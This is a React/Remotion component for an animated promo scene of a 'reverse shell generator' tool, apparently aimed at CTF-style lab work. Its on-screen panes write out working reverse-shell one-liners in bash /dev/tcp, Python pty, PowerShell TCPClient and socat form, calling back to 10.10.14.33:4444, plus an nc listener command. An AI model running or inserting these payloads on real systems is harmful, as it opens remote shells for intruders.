import React from "react";
import {
  AbsoluteFill,
  useCurrentFrame,
  useVideoConfig,
  spring,
  interpolate,
} from "remotion";
import { Copy, Terminal, Check, Zap, Wifi, ShieldAlert } from "lucide-react";
import { theme } from "../styles/theme";
import { TacticalHUD } from "../components/TacticalHUD";
import { CyberBadge } from "../components/CyberBadge";

export const Scene4_DynamicCheatsheet: React.FC = () => {
  const frame = useCurrentFrame();
  const { fps } = useVideoConfig();

  // Animated IP & Port typing
  const fullIp = "10.10.14.33";
  const ipCharCount = Math.floor(
    interpolate(frame, [15, 45], [0, fullIp.length], {
      extrapolateLeft: "clamp",
      extrapolateRight: "clamp",
    })
  );
  const currentIp = fullIp.slice(0, ipCharCount) || "10.10.14.X";

  const fullPort = "4444";
  const portCharCount = Math.floor(
    interpolate(frame, [45, 65], [0, fullPort.length], {
      extrapolateLeft: "clamp",
      extrapolateRight: "clamp",
    })
  );
  const currentPort = fullPort.slice(0, portCharCount) || "9001";

  // Copy notification triggered at frame 110
  const isCopied = frame >= 110;
  const copyPulse = spring({
    frame: frame - 110,
    fps,
    config: { damping: 12, stiffness: 120 },
  });

  // Scene exit fade
  const sceneOpacity = interpolate(frame, [165, 180], [1, 0], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });

  return (
    <AbsoluteFill
      style={{
        backgroundColor: theme.colors.bgDark,
        opacity: sceneOpacity,
        overflow: "hidden",
      }}
    >
      <TacticalHUD sceneTitle="STAGE 04 // DYNAMIC REVSHELL STUDIO" />

      {/* Cyber Grid */}
      <div
        style={{
          position: "absolute",
          inset: 0,
          backgroundImage: `linear-gradient(rgba(6, 182, 212, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(6, 182, 212, 0.05) 1px, transparent 1px)`,
          backgroundSize: "50px 50px",
        }}
      />

      <div
        style={{
          position: "absolute",
          inset: "80px 100px",
          display: "flex",
          flexDirection: "column",
          justifyContent: "space-between",
          zIndex: 10,
        }}
      >
        {/* Header */}
        <div>
          <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 8 }}>
            <CyberBadge label="LIVE REVERSE SHELL GENERATOR" variant="cyan" />
            <span
              style={{
                fontFamily: theme.fonts.mono,
                fontSize: 13,
                color: theme.colors.textMuted,
              }}
            >
              // SYNCHRONIZED MULTI-PAYLOAD COMPILER
            </span>
          </div>
          <h2
            style={{
              fontFamily: theme.fonts.sans,
              fontSize: 44,
              fontWeight: 800,
              color: theme.colors.textWhite,
              margin: 0,
              letterSpacing: -1,
            }}
          >
            Dynamic Cheatsheet & RevShell Studio
          </h2>
        </div>

        {/* Sticky Variables Bar */}
        <div
          style={{
            display: "flex",
            alignItems: "center",
            gap: 20,
            padding: "16px 24px",
            borderRadius: 12,
            backgroundColor: "rgba(19, 28, 46, 0.85)",
            border: `1px solid rgba(6, 182, 212, 0.4)`,
            boxShadow: theme.shadows.glowCyan,
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <Wifi size={18} color={theme.colors.cyanBright} />
            <span
              style={{
                fontFamily: theme.fonts.mono,
                fontSize: 13,
                fontWeight: 700,
                color: theme.colors.textMuted,
              }}
            >
              TUN0 INTERFACE:
            </span>
          </div>

          {/* LHOST Parameter */}
          <div
            style={{
              display: "flex",
              alignItems: "center",
              gap: 8,
              padding: "6px 14px",
              borderRadius: 6,
              backgroundColor: "rgba(11, 15, 25, 0.9)",
              border: `1px solid ${theme.colors.cyanBright}`,
            }}
          >
            <span
              style={{
                fontFamily: theme.fonts.mono,
                fontSize: 12,
                color: theme.colors.textDim,
              }}
            >
              LHOST:
            </span>
            <span
              style={{
                fontFamily: theme.fonts.mono,
                fontSize: 16,
                fontWeight: 700,
                color: theme.colors.cyanBright,
              }}
            >
              {currentIp}
            </span>
          </div>

          {/* LPORT Parameter */}
          <div
            style={{
              display: "flex",
              alignItems: "center",
              gap: 8,
              padding: "6px 14px",
              borderRadius: 6,
              backgroundColor: "rgba(11, 15, 25, 0.9)",
              border: `1px solid ${theme.colors.amberBright}`,
            }}
          >
            <span
              style={{
                fontFamily: theme.fonts.mono,
                fontSize: 12,
                color: theme.colors.textDim,
              }}
            >
              LPORT:
            </span>
            <span
              style={{
                fontFamily: theme.fonts.mono,
                fontSize: 16,
                fontWeight: 700,
                color: theme.colors.amberBright,
              }}
            >
              {currentPort}
            </span>
          </div>

          {/* TARGET IP Parameter */}
          <div
            style={{
              display: "flex",
              alignItems: "center",
              gap: 8,
              padding: "6px 14px",
              borderRadius: 6,
              backgroundColor: "rgba(11, 15, 25, 0.9)",
              border: "1px solid rgba(255, 255, 255, 0.1)",
            }}
          >
            <span
              style={{
                fontFamily: theme.fonts.mono,
                fontSize: 12,
                color: theme.colors.textDim,
              }}
            >
              TARGET:
            </span>
            <span
              style={{
                fontFamily: theme.fonts.mono,
                fontSize: 16,
                fontWeight: 600,
                color: theme.colors.textWhite,
              }}
            >
              10.129.2.1
            </span>
          </div>

          <div style={{ marginLeft: "auto", display: "flex", gap: 10 }}>
            <CyberBadge label="LIVE INJECTION ACTIVE" variant="emerald" glow />
          </div>
        </div>

        {/* 4 Payload Panes (2x2 Grid) */}
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16 }}>
          {/* Pane 1: Bash */}
          <div
            style={{
              padding: 20,
              borderRadius: 12,
              backgroundColor: "rgba(17, 24, 39, 0.8)",
              border: isCopied
                ? `2px solid ${theme.colors.emeraldBright}`
                : `1px solid rgba(255, 255, 255, 0.1)`,
              boxShadow: isCopied ? theme.shadows.glowEmerald : "none",
              transform: isCopied ? `scale(${1 + copyPulse * 0.03})` : "scale(1)",
              display: "flex",
              flexDirection: "column",
              justifyContent: "space-between",
            }}
          >
            <div
              style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                marginBottom: 12,
              }}
            >
              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                <Terminal size={16} color={theme.colors.emeraldBright} />
                <span
                  style={{
                    fontFamily: theme.fonts.mono,
                    fontSize: 14,
                    fontWeight: 700,
                    color: theme.colors.textWhite,
                  }}
                >
                  Bash TCP Interactive
                </span>
              </div>
              {isCopied ? (
                <CyberBadge
                  label="COPIED!"
                  variant="emerald"
                  icon={<Check size={12} />}
                  fontSize={11}
                />
              ) : (
                <Copy size={16} color={theme.colors.textDim} />
              )}
            </div>

            <div
              style={{
                fontFamily: theme.fonts.mono,
                fontSize: 14,
                backgroundColor: "rgba(11, 15, 25, 0.9)",
                padding: "12px 16px",
                borderRadius: 8,
                border: "1px solid rgba(255, 255, 255, 0.05)",
                color: theme.colors.textWhite,
              }}
            >
              <span>bash -i &gt;&amp; /dev/tcp/</span>
              <span style={{ color: theme.colors.cyanBright, fontWeight: 700 }}>
                {currentIp}
              </span>
              <span>/</span>
              <span style={{ color: theme.colors.amberBright, fontWeight: 700 }}>
                {currentPort}
              </span>
              <span> 0&gt;&amp;1</span>
            </div>
          </div>

          {/* Pane 2: Python */}
          <div
            style={{
              padding: 20,
              borderRadius: 12,
              backgroundColor: "rgba(17, 24, 39, 0.8)",
              border: "1px solid rgba(255, 255, 255, 0.1)",
              display: "flex",
              flexDirection: "column",
              justifyContent: "space-between",
            }}
          >
            <div
              style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                marginBottom: 12,
              }}
            >
              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                <Zap size={16} color={theme.colors.amberBright} />
                <span
                  style={{
                    fontFamily: theme.fonts.mono,
                    fontSize: 14,
                    fontWeight: 700,
                    color: theme.colors.textWhite,
                  }}
                >
                  Python3 PTY Reverse Shell
                </span>
              </div>
              <Copy size={16} color={theme.colors.textDim} />
            </div>

            <div
              style={{
                fontFamily: theme.fonts.mono,
                fontSize: 13,
                backgroundColor: "rgba(11, 15, 25, 0.9)",
                padding: "12px 16px",
                borderRadius: 8,
                border: "1px solid rgba(255, 255, 255, 0.05)",
                color: theme.colors.textWhite,
                overflow: "hidden",
                whiteSpace: "nowrap",
                textOverflow: "ellipsis",
              }}
            >
              <span>python3 -c &apos;import socket,os,pty;s=socket.socket();s.connect((&quot;</span>
              <span style={{ color: theme.colors.cyanBright, fontWeight: 700 }}>
                {currentIp}
              </span>
              <span>&quot;,</span>
              <span style={{ color: theme.colors.amberBright, fontWeight: 700 }}>
                {currentPort}
              </span>
              <span>));pty.spawn(&quot;/bin/bash&quot;)&apos;</span>
            </div>
          </div>

          {/* Pane 3: PowerShell */}
          <div
            style={{
              padding: 20,
              borderRadius: 12,
              backgroundColor: "rgba(17, 24, 39, 0.8)",
              border: "1px solid rgba(255, 255, 255, 0.1)",
              display: "flex",
              flexDirection: "column",
              justifyContent: "space-between",
            }}
          >
            <div
              style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                marginBottom: 12,
              }}
            >
              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                <ShieldAlert size={16} color={theme.colors.cyanBright} />
                <span
                  style={{
                    fontFamily: theme.fonts.mono,
                    fontSize: 14,
                    fontWeight: 700,
                    color: theme.colors.textWhite,
                  }}
                >
                  PowerShell TCP Bypass
                </span>
              </div>
              <Copy size={16} color={theme.colors.textDim} />
            </div>

            <div
              style={{
                fontFamily: theme.fonts.mono,
                fontSize: 13,
                backgroundColor: "rgba(11, 15, 25, 0.9)",
                padding: "12px 16px",
                borderRadius: 8,
                border: "1px solid rgba(255, 255, 255, 0.05)",
                color: theme.colors.textWhite,
                overflow: "hidden",
                whiteSpace: "nowrap",
                textOverflow: "ellipsis",
              }}
            >
              <span>$client = New-Object System.Net.Sockets.TCPClient(&quot;</span>
              <span style={{ color: theme.colors.cyanBright, fontWeight: 700 }}>
                {currentIp}
              </span>
              <span>&quot;,</span>
              <span style={{ color: theme.colors.amberBright, fontWeight: 700 }}>
                {currentPort}
              </span>
              <span>);$stream = $client.GetStream()...</span>
            </div>
          </div>

          {/* Pane 4: Socat */}
          <div
            style={{
              padding: 20,
              borderRadius: 12,
              backgroundColor: "rgba(17, 24, 39, 0.8)",
              border: "1px solid rgba(255, 255, 255, 0.1)",
              display: "flex",
              flexDirection: "column",
              justifyContent: "space-between",
            }}
          >
            <div
              style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                marginBottom: 12,
              }}
            >
              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                <Terminal size={16} color={theme.colors.purpleBright} />
                <span
                  style={{
                    fontFamily: theme.fonts.mono,
                    fontSize: 14,
                    fontWeight: 700,
                    color: theme.colors.textWhite,
                  }}
                >
                  Socat Full TTY Session
                </span>
              </div>
              <Copy size={16} color={theme.colors.textDim} />
            </div>

            <div
              style={{
                fontFamily: theme.fonts.mono,
                fontSize: 13,
                backgroundColor: "rgba(11, 15, 25, 0.9)",
                padding: "12px 16px",
                borderRadius: 8,
                border: "1px solid rgba(255, 255, 255, 0.05)",
                color: theme.colors.textWhite,
              }}
            >
              <span>socat exec:&apos;bash -li&apos;,pty,stderr tcp:</span>
              <span style={{ color: theme.colors.cyanBright, fontWeight: 700 }}>
                {currentIp}
              </span>
              <span>:</span>
              <span style={{ color: theme.colors.amberBright, fontWeight: 700 }}>
                {currentPort}
              </span>
            </div>
          </div>
        </div>

        {/* Bottom Listener Helper */}
        <div
          style={{
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
            padding: "12px 20px",
            borderRadius: 10,
            backgroundColor: "rgba(11, 15, 25, 0.95)",
            border: "1px solid rgba(255, 255, 255, 0.08)",
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <span style={{ fontFamily: theme.fonts.mono, fontSize: 13, color: theme.colors.textMuted }}>
              AUTO LISTENER COMMAND:
            </span>
            <code
              style={{
                fontFamily: theme.fonts.mono,
                fontSize: 14,
                color: theme.colors.emeraldBright,
                backgroundColor: "rgba(16, 185, 129, 0.1)",
                padding: "3px 10px",
                borderRadius: 4,
              }}
            >
              nc -lvnp {currentPort}
            </code>
          </div>

          <span style={{ fontFamily: theme.fonts.mono, fontSize: 12, color: theme.colors.textDim }}>
            40+ PAYLOAD TEMPLATES (MSFVENOM, AWK, RUBY, PHP, GOLANG)
          </span>
        </div>
      </div>
    </AbsoluteFill>
  );
};
